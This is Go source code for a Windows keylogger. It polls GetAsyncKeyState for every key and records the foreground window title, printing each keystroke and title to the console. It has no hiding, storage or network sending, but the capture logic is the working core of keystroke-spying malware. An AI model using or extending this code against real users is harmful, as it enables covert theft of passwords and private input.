package main

import (
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"

	"github.com/TheTitanrain/w32"
)

var (
	user32                  = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow") //GetForegroundWindow
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")      //GetWindowTextW

	tmpKeylog string
	tmpTitle  string
)

// Get Active Window Title
func getForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)
	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)
	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func getActiveWindowTitle() string {
  g, _ := getForegroundWindow()
  b := make([]uint16, 200)
  _, err := getWindowText(g, &b[0], int32(len(b)))
  if err != nil {
    fmt.Println("getactivewindowtitle-error:", err)
    return "error"
  }
  return syscall.UTF16ToString(b)
}

func windowLogger(window chan string) {
	for {
		g, _ := getForegroundWindow()
		b := make([]uint16, 200)
		_, err := getWindowText(g, &b[0], int32(len(b)))
		if err != nil {
		}
		if syscall.UTF16ToString(b) != "" {
			if tmpTitle != syscall.UTF16ToString(b) {
				tmpTitle = syscall.UTF16ToString(b)
				window <- tmpTitle
			}
		}
		time.Sleep(1 * time.Millisecond)
	}
}

type KeyCode int

const (
	CTRL KeyCode = iota
	BACK
	TAB
	ENTER
	SHIFT
	ALT
	CAPSLOCK
	ESC
	SPACE
	PAGEUP
	PAGEDOWN
	END
	LEFT
	UP
	RIGHT
	DOWN
	SELECT
	PRINT
	EXECUTE
	PRINTSCREEN
	INSERT
	DELETE
	HELP
	LEFTWINDOWS
	RIGHTWINDOWS
	APPLICATIONS
	SLEEP
	PAD0
	PAD1
	PAD2
	PAD3
	PAD4
	PAD5
	PAD6
	PAD7
	PAD8
	PAD9
	MULTIPLY
	ADD
	SEPARATOR
	SUBTRACT
	DECIMAL
	DIVIDE
	F1
	F2
	F3
	F4
	F5
	F6
	F7
	F8
	F9
	F10
	F11
	F12
	NUMLOCK
	SCROLLLOCK
	LSHIFT
	RSHIFT
	LCTRL
	RCTRL
	LeftMENU
	RightMENU
	SEMICOLON
	SLASH
	BACKTICK
	LEFTBRACKET
	BACKSLASH
	RIGHTBRACKET
	SINGLEQUOTE
	PERIOD
	ZERO
	ONE
	TWO
	THREE
	FOUR
	FIVE
	SIX
	SEVEN
	EIGHT
	NINE
	A
	B
	C
	D
	E
	F
	G
	H
	I
	J
	K
	L
	M
	N
	O
	P
	Q
	R
	S
	T
	U
	V
	W
	X
	Y
	Z
	LBUTTON
	RBUTTON
	MBUTTON
	UNKNOWN
)

func toKeycode(key int) KeyCode {
	switch key {
	case w32.VK_RSHIFT:
		return RSHIFT
	case w32.VK_LCONTROL:
		return LCTRL
	case w32.VK_RCONTROL:
		return RCTRL
	case w32.VK_LMENU:
		return LeftMENU
	case w32.VK_RMENU:
		return RightMENU
	case w32.VK_OEM_1:
		return SEMICOLON
	case w32.VK_OEM_2:
		return SLASH
	case w32.VK_OEM_3:
		return BACKTICK
	case w32.VK_OEM_4:
		return LEFTBRACKET
	case w32.VK_OEM_5:
		return BACKSLASH
	case w32.VK_OEM_6:
		return RIGHTBRACKET
	case w32.VK_OEM_7:
		return SINGLEQUOTE
	case w32.VK_OEM_PERIOD:
		return PERIOD
	case 0x30:
		return ZERO
	case 0x31:
		return ONE
	case 0x32:
		return TWO
	case 0x33:
		return THREE
	case 0x34:
		return FOUR
	case 0x35:
		return FIVE
	case 0x36:
		return SIX
	case 0x37:
		return SEVEN
	case 0x38:
		return EIGHT
	case 0x39:
		return NINE
	case 0x41:
		return A
	case 0x42:
		return B
	case 0x43:
		return C
	case 0x44:
		return D
	case 0x45:
		return E
	case 0x46:
		return F
	case 0x47:
		return G
	case 0x48:
		return H
	case 0x49:
		return I
	case 0x4A:
		return J
	case 0x4B:
		return K
	case 0x4C:
		return L
	case 0x4D:
		return M
	case 0x4E:
		return N
	case 0x4F:
		return O
	case 0x50:
		return P
	case 0x51:
		return Q
	case 0x52:
		return R
	case 0x53:
		return S
	case 0x54:
		return T
	case 0x55:
		return U
	case 0x56:
		return V
	case 0x57:
		return W
	case 0x58:
		return X
	case 0x59:
		return Y
	case 0x5A:
		return Z
	case 0x01:
		return LBUTTON
	case 0x02:
		return RBUTTON
	case 0x04:
		return MBUTTON
	}

	fmt.Println("unknown key:", fmt.Sprintf("%d", key))
	return UNKNOWN
}

func GetPressedKeys() []KeyCode {
	var keys []KeyCode
	for KEY := 0; KEY <= 256; KEY++ {
		Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
		if Val == 32769 {
			keys = append(keys, toKeycode(KEY))
		} else if Val == 32768 {
			keys = append(keys, toKeycode(KEY))
		} else if Val == 1 {
			keys = append(keys, toKeycode(KEY))
		} else if Val != 0 {
			fmt.Println("unknown value:", Val, " key:", toKeycode(KEY))
		}
	}
	return keys
}

func keyLogger(keys chan KeyCode) {
	for {
		time.Sleep(1 * time.Millisecond)
		for KEY := 0; KEY <= 256; KEY++ {
			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
			if Val == 32769 {
				keys <- toKeycode(KEY)
			} else if Val == 32768 {
				keys <- toKeycode(KEY)
			} else if Val == 1 {
				keys <- toKeycode(KEY)
			} else if Val != 0 {
				fmt.Println("unknown value:", Val, " key:", toKeycode(KEY))
			}
		}
	}
}

func read(prefix string, windowTitle chan string) {
	for {
		val := <-windowTitle
		fmt.Println(prefix, val)
	}
}

func readKeys(prefix string, keys chan KeyCode) {
	for {
		val := <-keys
		fmt.Println(prefix, val)
	}
}

func main() {
	fmt.Println("Starting KeyLogger!")
	windowTitle := make(chan string)
	keys := make(chan KeyCode)
	go windowLogger(windowTitle)

	go func() {
		for {
      window := getActiveWindowTitle()
      fmt.Println("window:", window)

			keys := GetPressedKeys() 
			for _, key := range keys {
				fmt.Println("key:", key)
			}
			time.Sleep(1 * time.Millisecond)
		}
	}()

	go read("window:", windowTitle)
	go readKeys("key:", keys)
	fmt.Println("Press Enter to Exit.")
	os.Stdin.Read([]byte{0})
}
